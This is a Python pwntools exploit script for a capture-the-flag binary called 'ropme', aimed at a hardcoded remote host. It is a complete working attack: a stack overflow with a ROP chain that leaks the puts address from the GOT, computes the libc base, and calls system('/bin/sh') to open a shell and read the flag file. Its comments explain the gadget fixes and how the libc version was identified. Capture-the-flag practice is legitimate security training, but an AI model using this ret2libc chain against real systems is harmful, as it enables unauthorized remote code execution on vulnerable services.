#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ropme --host 88.198.233.174 --port 38751
from pwn import *
from pwnlib.constants import PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANON
from binascii import hexlify

# Set up pwntools for the correct architecture
context(os="linux", arch="amd64")
exe = context.binary = ELF('ropme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '88.198.233.174'
port = int(args.PORT or 39293)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.terminal = ["xfce4-terminal", "-e"]
io = start()
rop = ROP(exe)

message = "ROP me outside, how 'about dah?"
# few important addresses
main_addr = 0x400626
main_puts_call_addr = 0x40063A
main_fflush_call_addr = 0x40063F
puts_got = 0x601018
puts_plt = 0x4004E0

# create the rop chain to leak some addr
rop.puts(puts_got)
rop.raw(main_addr)
log.info("Generated ROP for leaking puts address\n" + rop.dump())
payload = cyclic(72) + rop.chain()

# leaaaaaaaaaak
io.sendlineafter(message, payload)
io.recv() # discard
data = io.recvline() # actual addr
io.recv() # discard
puts_addr = unpack(data[:-1] + "\x00" * 2)
log.success("puts address leaked: " + hex(puts_addr))

# received addr for puts had the signature 690
# using https://libc.blukat.me we see that the corresponding libc is
# libc6_2.23-0ubuntu10_amd64

if args.REMOTE:
    libc = ELF("libc6_2.23-0ubuntu10_amd64.so")
else:
    libc = ELF("/usr/lib/libc.so.6")
rop = ROP(libc)

libc.address = puts_addr - libc.symbols['puts']
log.success("Leaked libc: " + hex(libc.address))

# it seems that pwntools has a little bug at resolving some gadgets
# it could be a problem only for my machine
def fix_buggy_rop(payload):
    if args.REMOTE:
        payload = payload.replace(p64(0x21102), p64(0x4006d3)) # pop rdi
    else:
        payload = payload.replace(p64(0x22a2f), p64(0x4006d3))
    return payload

# for some strange reason, the offset of '/bin/bash' is not exactly the same
# I think that I did not downloaded the same lib
# But after some debug, I found that I just need to reducce the offset with 64 bytes
rop.search(regs=['rdi'], order='regs')
rop.system(next(libc.search('/bin/sh\x00')) - 64)
log.info("Generated ROP shell:\n" + rop.dump())
payload = fix_buggy_rop(cyclic(72) + rop.chain())
io.sendline(payload)
io.sendline("cat flag.txt")
flag = io.recvline()
log.success("Flag: " + flag)
